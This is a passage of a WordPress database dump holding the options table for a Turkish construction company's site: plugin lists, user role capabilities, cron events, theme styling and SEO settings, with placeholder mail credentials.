INSERT INTO `cmrfu_options` VALUES("12","rss_use_excerpt","0","yes");
INSERT INTO `cmrfu_options` VALUES("13","mailserver_url","mail.example.com","yes");
INSERT INTO `cmrfu_options` VALUES("14","mailserver_login","login@example.com","yes");
INSERT INTO `cmrfu_options` VALUES("15","mailserver_pass","password","yes");
INSERT INTO `cmrfu_options` VALUES("16","mailserver_port","110","yes");
INSERT INTO `cmrfu_options` VALUES("17","default_category","1","yes");
INSERT INTO `cmrfu_options` VALUES("18","default_comment_status","open","yes");
INSERT INTO `cmrfu_options` VALUES("19","default_ping_status","open","yes");
INSERT INTO `cmrfu_options` VALUES("20","default_pingback_flag","1","yes");
INSERT INTO `cmrfu_options` VALUES("21","posts_per_page","10","yes");
INSERT INTO `cmrfu_options` VALUES("22","date_format","j F Y","yes");
INSERT INTO `cmrfu_options` VALUES("23","time_format","H:i","yes");
INSERT INTO `cmrfu_options` VALUES("24","links_updated_date_format","j F Y H:i","yes");
INSERT INTO `cmrfu_options` VALUES("28","comment_moderation","0","yes");
INSERT INTO `cmrfu_options` VALUES("29","moderation_notify","1","yes");
INSERT INTO `cmrfu_options` VALUES("30","permalink_structure","/%postname%/","yes");
INSERT INTO `cmrfu_options` VALUES("32","hack_file","0","yes");
INSERT INTO `cmrfu_options` VALUES("33","blog_charset","UTF-8","yes");
INSERT INTO `cmrfu_options` VALUES("34","moderation_keys","","no");
INSERT INTO `cmrfu_options` VALUES("35","active_plugins","a:10:{i:0;s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";i:1;s:36:\"contact-form-7/wp-contact-form-7.php\";i:2;s:16:\"gotmls/index.php\";i:3;s:35:\"jquery-colorbox/jquery-colorbox.php\";i:4;s:47:\"really-simple-captcha/really-simple-captcha.php\";i:5;s:23:\"revslider/revslider.php\";i:6;s:20:\"smtp-mailer/main.php\";i:7;s:41:\"wordpress-importer/wordpress-importer.php\";i:8;s:24:\"wordpress-seo/wp-seo.php\";i:9;s:27:\"wp-super-cache/wp-cache.php\";}","yes");
INSERT INTO `cmrfu_options` VALUES("2711","mail_from_name","herkon yapı","yes");
INSERT INTO `cmrfu_options` VALUES("36","home","https://www.herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("37","category_base","","yes");
INSERT INTO `cmrfu_options` VALUES("38","ping_sites","http://rpc.pingomatic.com/","yes");
INSERT INTO `cmrfu_options` VALUES("40","comment_max_links","2","yes");
INSERT INTO `cmrfu_options` VALUES("41","gmt_offset","","yes");
INSERT INTO `cmrfu_options` VALUES("42","default_email_category","1","yes");
INSERT INTO `cmrfu_options` VALUES("43","recently_edited","a:3:{i:0;s:93:\"/home/srkn/herkonyapi.com/public_html/wp-content/themes/er-leaf/framework/theme-functions.php\";i:1;s:73:\"/home/srkn/herkonyapi.com/public_html/wp-content/themes/er-leaf/style.css\";i:2;b:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("44","template","er-leaf","yes");
INSERT INTO `cmrfu_options` VALUES("45","stylesheet","er-leaf","yes");
INSERT INTO `cmrfu_options` VALUES("46","comment_whitelist","1","yes");
INSERT INTO `cmrfu_options` VALUES("47","blacklist_keys","","no");
INSERT INTO `cmrfu_options` VALUES("48","comment_registration","0","yes");
INSERT INTO `cmrfu_options` VALUES("49","html_type","text/html","yes");
INSERT INTO `cmrfu_options` VALUES("50","use_trackback","0","yes");
INSERT INTO `cmrfu_options` VALUES("51","default_role","subscriber","yes");
INSERT INTO `cmrfu_options` VALUES("52","db_version","38590","yes");
INSERT INTO `cmrfu_options` VALUES("53","uploads_use_yearmonth_folders","1","yes");
INSERT INTO `cmrfu_options` VALUES("54","upload_path","","yes");
INSERT INTO `cmrfu_options` VALUES("55","blog_public","1","yes");
INSERT INTO `cmrfu_options` VALUES("56","default_link_category","2","yes");
INSERT INTO `cmrfu_options` VALUES("57","show_on_front","page","yes");
INSERT INTO `cmrfu_options` VALUES("58","tag_base","","yes");
INSERT INTO `cmrfu_options` VALUES("59","show_avatars","1","yes");
INSERT INTO `cmrfu_options` VALUES("60","avatar_rating","G","yes");
INSERT INTO `cmrfu_options` VALUES("61","upload_url_path","","yes");
INSERT INTO `cmrfu_options` VALUES("62","thumbnail_size_w","150","yes");
INSERT INTO `cmrfu_options` VALUES("63","thumbnail_size_h","150","yes");
INSERT INTO `cmrfu_options` VALUES("64","thumbnail_crop","1","yes");
INSERT INTO `cmrfu_options` VALUES("65","medium_size_w","300","yes");
INSERT INTO `cmrfu_options` VALUES("66","medium_size_h","300","yes");
INSERT INTO `cmrfu_options` VALUES("67","avatar_default","mystery","yes");
INSERT INTO `cmrfu_options` VALUES("68","large_size_w","1024","yes");
INSERT INTO `cmrfu_options` VALUES("69","large_size_h","1024","yes");
INSERT INTO `cmrfu_options` VALUES("70","image_default_link_type","file","yes");
INSERT INTO `cmrfu_options` VALUES("71","image_default_size","","yes");
INSERT INTO `cmrfu_options` VALUES("72","image_default_align","","yes");
INSERT INTO `cmrfu_options` VALUES("73","close_comments_for_old_posts","0","yes");
INSERT INTO `cmrfu_options` VALUES("74","close_comments_days_old","14","yes");
INSERT INTO `cmrfu_options` VALUES("75","thread_comments","1","yes");
INSERT INTO `cmrfu_options` VALUES("76","thread_comments_depth","5","yes");
INSERT INTO `cmrfu_options` VALUES("77","page_comments","0","yes");
INSERT INTO `cmrfu_options` VALUES("78","comments_per_page","50","yes");
INSERT INTO `cmrfu_options` VALUES("79","default_comments_page","newest","yes");
INSERT INTO `cmrfu_options` VALUES("80","comment_order","asc","yes");
INSERT INTO `cmrfu_options` VALUES("81","sticky_posts","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("82","widget_categories","a:2:{i:2;a:4:{s:5:\"title\";s:0:\"\";s:5:\"count\";i:0;s:12:\"hierarchical\";i:0;s:8:\"dropdown\";i:0;}s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("83","widget_text","a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("84","widget_rss","a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("85","uninstall_plugins","a:3:{s:35:\"jquery-colorbox/jquery-colorbox.php\";a:2:{i:0;s:14:\"JQueryColorbox\";i:1;s:23:\"uninstallJqueryColorbox\";}s:27:\"wp-super-cache/wp-cache.php\";s:22:\"wpsupercache_uninstall\";s:39:\"underconstruction/underConstruction.php\";s:30:\"underConstructionPlugin_delete\";}","no");
INSERT INTO `cmrfu_options` VALUES("86","timezone_string","Europe/Istanbul","yes");
INSERT INTO `cmrfu_options` VALUES("87","page_for_posts","454","yes");
INSERT INTO `cmrfu_options` VALUES("88","page_on_front","524","yes");
INSERT INTO `cmrfu_options` VALUES("89","default_post_format","0","yes");
INSERT INTO `cmrfu_options` VALUES("90","link_manager_enabled","0","yes");
INSERT INTO `cmrfu_options` VALUES("91","initial_db_version","26691","yes");
INSERT INTO `cmrfu_options` VALUES("92","cmrfu_user_roles","a:5:{s:13:\"administrator\";a:2:{s:4:\"name\";s:13:\"Administrator\";s:12:\"capabilities\";a:62:{s:13:\"switch_themes\";b:1;s:11:\"edit_themes\";b:1;s:16:\"activate_plugins\";b:1;s:12:\"edit_plugins\";b:1;s:10:\"edit_users\";b:1;s:10:\"edit_files\";b:1;s:14:\"manage_options\";b:1;s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:6:\"import\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:8:\"level_10\";b:1;s:7:\"level_9\";b:1;s:7:\"level_8\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:12:\"delete_users\";b:1;s:12:\"create_users\";b:1;s:17:\"unfiltered_upload\";b:1;s:14:\"edit_dashboard\";b:1;s:14:\"update_plugins\";b:1;s:14:\"delete_plugins\";b:1;s:15:\"install_plugins\";b:1;s:13:\"update_themes\";b:1;s:14:\"install_themes\";b:1;s:11:\"update_core\";b:1;s:10:\"list_users\";b:1;s:12:\"remove_users\";b:1;s:13:\"promote_users\";b:1;s:18:\"edit_theme_options\";b:1;s:13:\"delete_themes\";b:1;s:6:\"export\";b:1;s:15:\"wpseo_bulk_edit\";b:1;}}s:6:\"editor\";a:2:{s:4:\"name\";s:6:\"Editor\";s:12:\"capabilities\";a:35:{s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:15:\"wpseo_bulk_edit\";b:1;}}s:6:\"author\";a:2:{s:4:\"name\";s:6:\"Author\";s:12:\"capabilities\";a:10:{s:12:\"upload_files\";b:1;s:10:\"edit_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;s:22:\"delete_published_posts\";b:1;}}s:11:\"contributor\";a:2:{s:4:\"name\";s:11:\"Contributor\";s:12:\"capabilities\";a:5:{s:10:\"edit_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;}}s:10:\"subscriber\";a:2:{s:4:\"name\";s:10:\"Subscriber\";s:12:\"capabilities\";a:2:{s:4:\"read\";b:1;s:7:\"level_0\";b:1;}}}","yes");
INSERT INTO `cmrfu_options` VALUES("93","widget_search","a:2:{i:2;a:1:{s:5:\"title\";s:0:\"\";}s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("94","widget_recent-posts","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("95","widget_recent-comments","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("96","widget_archives","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("97","widget_meta","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("98","sidebars_widgets","a:11:{s:19:\"wp_inactive_widgets\";a:0:{}s:15:\"default-sidebar\";a:2:{i:0;s:8:\"search-2\";i:1;s:12:\"categories-2\";}s:8:\"topbar-1\";a:0:{}s:8:\"topbar-2\";a:0:{}s:8:\"topbar-3\";a:0:{}s:8:\"topbar-4\";a:0:{}s:8:\"footer-1\";a:0:{}s:8:\"footer-2\";a:0:{}s:8:\"footer-3\";a:0:{}s:8:\"footer-4\";a:0:{}s:13:\"array_version\";i:3;}","yes");
INSERT INTO `cmrfu_options` VALUES("99","cron","a:7:{i:1490287491;a:1:{s:24:\"aiowps_hourly_cron_event\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:6:\"hourly\";s:4:\"args\";a:0:{}s:8:\"interval\";i:3600;}}}i:1490291368;a:1:{s:30:\"wp_scheduled_auto_draft_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1490301891;a:1:{s:23:\"aiowps_daily_cron_event\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1490310509;a:3:{s:16:\"wp_version_check\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:17:\"wp_update_plugins\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:16:\"wp_update_themes\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}}i:1490353754;a:1:{s:19:\"wp_scheduled_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1490820448;a:1:{s:18:\"wpseo_onpage_fetch\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:6:\"weekly\";s:4:\"args\";a:0:{}s:8:\"interval\";i:604800;}}}s:7:\"version\";i:2;}","yes");
INSERT INTO `cmrfu_options` VALUES("15402","WPLANG","tr_TR","yes");
INSERT INTO `cmrfu_options` VALUES("188","ossdl_off_include_dirs","wp-content,wp-includes","yes");
INSERT INTO `cmrfu_options` VALUES("21124","_site_transient_timeout_theme_roots","1490269495","no");
INSERT INTO `cmrfu_options` VALUES("21125","_site_transient_theme_roots","a:1:{s:7:\"er-leaf\";s:7:\"/themes\";}","no");
INSERT INTO `cmrfu_options` VALUES("187","ossdl_off_cdn_url","http://herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("163","theme_mods_twentyfourteen","a:1:{s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1392750025;s:4:\"data\";a:4:{s:19:\"wp_inactive_widgets\";a:0:{}s:9:\"sidebar-1\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}}}}","yes");
INSERT INTO `cmrfu_options` VALUES("164","current_theme","ER-Leaf (Shared on www.MafiaShare.net)","yes");
INSERT INTO `cmrfu_options` VALUES("165","theme_mods_er-leaf","a:113:{s:15:\"general_heading\";s:12:\"Blog Options\";s:21:\"textarea_trackingcode\";s:0:\"\";s:13:\"media_favicon\";s:0:\"\";s:20:\"media_favicon_iphone\";s:0:\"\";s:27:\"media_favicon_iphone_retina\";s:0:\"\";s:18:\"media_favicon_ipad\";s:0:\"\";s:25:\"media_favicon_ipad_retina\";s:0:\"\";s:18:\"select_layoutstyle\";s:12:\"Boxed Layout\";s:16:\"check_responsive\";i:1;s:8:\"media_bg\";s:56:\"[site_url]/wp-content/uploads/2014/02/bright_squares.png\";s:9:\"select_bg\";s:6:\"repeat\";s:8:\"color_bg\";s:5:\"#1111\";s:16:\"check_topwidgets\";s:1:\"0\";s:21:\"topbar_widget_1_width\";s:5:\"col-4\";s:21:\"topbar_widget_2_width\";s:5:\"col-4\";s:21:\"topbar_widget_3_width\";s:5:\"col-4\";s:21:\"topbar_widget_4_width\";s:5:\"col-4\";s:16:\"select_main_menu\";s:9:\"Fullwidth\";s:16:\"text_companynews\";s:0:\"\";s:11:\"text_callus\";s:0:\"\";s:17:\"check_companynews\";s:1:\"0\";s:18:\"style_headerheight\";s:4:\"auto\";s:10:\"media_logo\";s:46:\"[site_url]/wp-content/uploads/2014/08/logo.png\";s:19:\"style_logotopmargin\";s:4:\"20px\";s:22:\"style_logobottommargin\";s:3:\"0px\";s:17:\"media_logo_retina\";s:46:\"[site_url]/wp-content/uploads/2014/08/logo.png\";s:10:\"logo_width\";s:0:\"\";s:11:\"logo_height\";s:0:\"\";s:17:\"check_footertweet\";s:1:\"0\";s:21:\"footer_widget_1_width\";s:5:\"col-4\";s:21:\"footer_widget_2_width\";s:5:\"col-4\";s:21:\"footer_widget_3_width\";s:5:\"col-4\";s:21:\"footer_widget_4_width\";s:5:\"col-4\";s:18:\"textarea_copyright\";s:29:\"Copyright 2014 herkonyapi.com\";s:9:\"font_body\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#232323\";}s:7:\"font_h1\";a:4:{s:4:\"size\";s:4:\"22px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h2\";a:4:{s:4:\"size\";s:4:\"20px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h3\";a:4:{s:4:\"size\";s:4:\"18px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h4\";a:4:{s:4:\"size\";s:4:\"16px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h5\";a:4:{s:4:\"size\";s:4:\"14px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:7:\"font_h6\";a:4:{s:4:\"size\";s:4:\"12px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#666666\";}s:13:\"color_general\";s:7:\"#26c4e7\";s:10:\"color_link\";s:7:\"#555555\";s:11:\"color_hover\";s:7:\"#26c4e7\";s:21:\"background_top_widget\";s:7:\"#181818\";s:23:\"font_top_widget_heading\";a:4:{s:4:\"size\";s:4:\"16px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#797979\";}s:16:\"color_top_widget\";s:7:\"#333333\";s:28:\"color_top_widget_form_border\";s:7:\"#222222\";s:34:\"color_focus_top_widget_form_border\";s:7:\"#333333\";s:22:\"color_label_top_widget\";s:7:\"#333333\";s:27:\"background_top_search_input\";s:7:\"#222222\";s:38:\"background_focustop_search_input_focus\";s:7:\"#212121\";s:22:\"color_top_search_input\";s:7:\"#797979\";s:22:\"color_header_boder_top\";s:7:\"#26c4e7\";s:29:\"color_header_background_color\";s:7:\"#ffffff\";s:11:\"font_callus\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#aaaaaa\";}s:8:\"font_nav\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#555555\";}s:18:\"color_navlinkhover\";s:7:\"#26c4e7\";s:19:\"color_navlinkactive\";s:7:\"#26c4e7\";s:15:\"color_submenubg\";s:7:\"#191919\";s:19:\"color_submenuborder\";s:7:\"#222222\";s:17:\"color_submenulink\";s:7:\"#dedede\";s:20:\"color_submenubghover\";s:7:\"#111111\";s:22:\"color_submenulinkhover\";s:7:\"#eeeeee\";s:32:\"color_portfolio_title_background\";s:7:\"#26c4e7\";s:21:\"color_portfolio_title\";s:7:\"#ffffff\";s:24:\"color_portfolio_category\";s:7:\"#ffffff\";s:30:\"color_hover_portfolio_category\";s:7:\"#eeeeee\";s:17:\"font_widget_title\";a:4:{s:4:\"size\";s:4:\"14px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#232323\";}s:23:\"border_top_widget_title\";a:3:{s:5:\"width\";s:1:\"1\";s:5:\"style\";s:5:\"solid\";s:5:\"color\";s:7:\"#232323\";}s:26:\"border_bottom_widget_title\";a:3:{s:5:\"width\";s:1:\"1\";s:5:\"style\";s:5:\"solid\";s:5:\"color\";s:7:\"#f1f1f1\";}s:19:\"font_sidebar_widget\";a:4:{s:4:\"size\";s:4:\"13px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:6:\"normal\";s:5:\"color\";s:7:\"#232323\";}s:25:\"color_link_sidebar_widget\";s:7:\"#555555\";s:31:\"color_link_hover_sidebar_widget\";s:7:\"#27b59d\";s:22:\"background_twitter_bar\";s:7:\"#26c4e7\";s:17:\"color_twitter_bar\";s:7:\"#ffffff\";s:22:\"color_link_twitter_bar\";s:7:\"#ffffff\";s:28:\"color_link_hover_twitter_bar\";s:7:\"#ffffff\";s:14:\"color_footerbg\";s:7:\"#181818\";s:16:\"color_footertext\";s:7:\"#797979\";s:19:\"font_footerheadline\";a:4:{s:4:\"size\";s:4:\"14px\";s:4:\"face\";s:9:\"Open Sans\";s:5:\"style\";s:4:\"bold\";s:5:\"color\";s:7:\"#cccccc\";}s:16:\"color_footerlink\";s:7:\"#797979\";s:21:\"color_footerlinkhover\";s:7:\"#cccccc\";s:17:\"color_copyrightbg\";s:7:\"#060606\";s:19:\"color_copyrighttext\";s:7:\"#393939\";s:19:\"color_copyrightlink\";s:7:\"#393939\";s:24:\"color_copyrightlinkhover\";s:7:\"#494949\";s:17:\"select_bloglayout\";s:10:\"Blog Large\";s:18:\"select_blogsidebar\";s:13:\"sidebar-right\";s:14:\"check_sharebox\";i:1;s:18:\"text_excerptlength\";s:2:\"30\";s:15:\"check_authorbox\";i:1;s:16:\"check_relatepost\";i:1;s:18:\"text_portfolioslug\";s:14:\"portfolio-item\";s:28:\"text_portfolio_category_slug\";s:18:\"portfolio_category\";s:23:\"text_portfolio_tag_slug\";s:12:\"tag_category\";s:24:\"select_portfolio_archive\";s:9:\"4 Columns\";s:12:\"introduction\";s:75:\"Enter your username / URL to show or leave blank to hide Social Media Icons\";s:14:\"social_twitter\";s:10:\"herkonyapi\";s:15:\"social_dribbble\";s:0:\"\";s:13:\"social_flickr\";s:0:\"\";s:15:\"social_facebook\";s:30:\"http://facebook.com/herkonyapi\";s:13:\"social_google\";s:0:\"\";s:15:\"social_linkedin\";s:0:\"\";s:14:\"social_youtube\";s:0:\"\";s:16:\"social_pinterest\";s:0:\"\";s:10:\"social_rss\";i:1;s:16:\"textarea_csscode\";s:0:\"\";s:9:\"of_backup\";s:0:\"\";s:11:\"of_transfer\";s:0:\"\";s:9:\"smof_init\";s:31:\"Mon, 02 Jun 2014 09:04:31 +0000\";s:18:\"nav_menu_locations\";a:2:{s:6:\"header\";i:51;s:6:\"footer\";i:52;}s:18:\"custom_css_post_id\";i:-1;}","yes");
INSERT INTO `cmrfu_options` VALUES("166","theme_switched","","yes");
INSERT INTO `cmrfu_options` VALUES("189","ossdl_off_exclude",".php","yes");
INSERT INTO `cmrfu_options` VALUES("180","wpseo","a:23:{s:14:\"blocking_files\";a:0:{}s:15:\"ms_defaults_set\";b:0;s:7:\"version\";s:3:\"4.4\";s:12:\"company_logo\";s:0:\"\";s:12:\"company_name\";s:0:\"\";s:17:\"company_or_person\";s:0:\"\";s:20:\"disableadvanced_meta\";b:1;s:19:\"onpage_indexability\";b:1;s:12:\"googleverify\";s:0:\"\";s:8:\"msverify\";s:0:\"\";s:11:\"person_name\";s:0:\"\";s:12:\"website_name\";s:0:\"\";s:22:\"alternate_website_name\";s:0:\"\";s:12:\"yandexverify\";s:0:\"\";s:9:\"site_type\";s:0:\"\";s:20:\"has_multiple_authors\";b:0;s:16:\"environment_type\";s:0:\"\";s:23:\"content_analysis_active\";b:1;s:23:\"keyword_analysis_active\";b:1;s:20:\"enable_setting_pages\";b:1;s:21:\"enable_admin_bar_menu\";b:1;s:22:\"show_onboarding_notice\";b:0;s:18:\"first_activated_on\";i:1476662827;}","yes");
INSERT INTO `cmrfu_options` VALUES("181","wpseo_titles","a:98:{s:10:\"title_test\";i:0;s:17:\"forcerewritetitle\";b:0;s:14:\"hide-feedlinks\";b:0;s:12:\"hide-rsdlink\";b:0;s:14:\"hide-shortlink\";b:0;s:16:\"hide-wlwmanifest\";b:0;s:5:\"noodp\";b:0;s:6:\"noydir\";b:0;s:15:\"usemetakeywords\";b:0;s:16:\"title-home-wpseo\";s:42:\"%%sitename%% %%page%% %%sep%% %%sitedesc%%\";s:18:\"title-author-wpseo\";s:41:\"%%name%%, Author at %%sitename%% %%page%%\";s:19:\"title-archive-wpseo\";s:38:\"%%date%% %%page%% %%sep%% %%sitename%%\";s:18:\"title-search-wpseo\";s:63:\"You searched for %%searchphrase%% %%page%% %%sep%% %%sitename%%\";s:15:\"title-404-wpseo\";s:35:\"Page Not Found %%sep%% %%sitename%%\";s:19:\"metadesc-home-wpseo\";s:0:\"\";s:21:\"metadesc-author-wpseo\";s:0:\"\";s:22:\"metadesc-archive-wpseo\";s:0:\"\";s:18:\"metakey-home-wpseo\";s:0:\"\";s:20:\"metakey-author-wpseo\";s:0:\"\";s:22:\"noindex-subpages-wpseo\";b:0;s:20:\"noindex-author-wpseo\";b:0;s:21:\"noindex-archive-wpseo\";b:1;s:14:\"disable-author\";b:0;s:12:\"disable-date\";b:0;s:10:\"title-post\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:13:\"metadesc-post\";s:0:\"\";s:12:\"metakey-post\";s:0:\"\";s:12:\"noindex-post\";b:0;s:17:\"noauthorship-post\";b:0;s:13:\"showdate-post\";b:0;s:16:\"hideeditbox-post\";b:0;s:10:\"title-page\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:13:\"metadesc-page\";s:0:\"\";s:12:\"metakey-page\";s:0:\"\";s:12:\"noindex-page\";b:0;s:17:\"noauthorship-page\";b:0;s:13:\"showdate-page\";b:0;s:16:\"hideeditbox-page\";b:0;s:16:\"title-attachment\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:19:\"metadesc-attachment\";s:0:\"\";s:18:\"metakey-attachment\";s:0:\"\";s:18:\"noindex-attachment\";b:0;s:23:\"noauthorship-attachment\";b:0;s:19:\"showdate-attachment\";b:0;s:22:\"hideeditbox-attachment\";b:0;s:15:\"title-portfolio\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:18:\"metadesc-portfolio\";s:0:\"\";s:17:\"metakey-portfolio\";s:0:\"\";s:17:\"noindex-portfolio\";b:0;s:22:\"noauthorship-portfolio\";b:0;s:18:\"showdate-portfolio\";b:0;s:21:\"hideeditbox-portfolio\";b:0;s:12:\"title-slider\";s:39:\"%%title%% %%page%% %%sep%% %%sitename%%\";s:15:\"metadesc-slider\";s:0:\"\";s:14:\"metakey-slider\";s:0:\"\";s:14:\"noindex-slider\";b:0;s:19:\"noauthorship-slider\";b:0;s:15:\"showdate-slider\";b:0;s:18:\"hideeditbox-slider\";b:0;s:25:\"title-ptarchive-portfolio\";s:51:\"%%pt_plural%% Archive %%page%% %%sep%% %%sitename%%\";s:28:\"metadesc-ptarchive-portfolio\";s:0:\"\";s:27:\"metakey-ptarchive-portfolio\";s:0:\"\";s:27:\"bctitle-ptarchive-portfolio\";s:0:\"\";s:27:\"noindex-ptarchive-portfolio\";b:0;s:22:\"title-ptarchive-slider\";s:51:\"%%pt_plural%% Archive %%page%% %%sep%% %%sitename%%\";s:25:\"metadesc-ptarchive-slider\";s:0:\"\";s:24:\"metakey-ptarchive-slider\";s:0:\"\";s:24:\"bctitle-ptarchive-slider\";s:0:\"\";s:24:\"noindex-ptarchive-slider\";b:0;s:18:\"title-tax-category\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:21:\"metadesc-tax-category\";s:0:\"\";s:20:\"metakey-tax-category\";s:0:\"\";s:24:\"hideeditbox-tax-category\";b:0;s:20:\"noindex-tax-category\";b:0;s:18:\"title-tax-post_tag\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:21:\"metadesc-tax-post_tag\";s:0:\"\";s:20:\"metakey-tax-post_tag\";s:0:\"\";s:24:\"hideeditbox-tax-post_tag\";b:0;s:20:\"noindex-tax-post_tag\";b:0;s:21:\"title-tax-post_format\";s:53:\"%%term_title%% Archives %%page%% %%sep%% 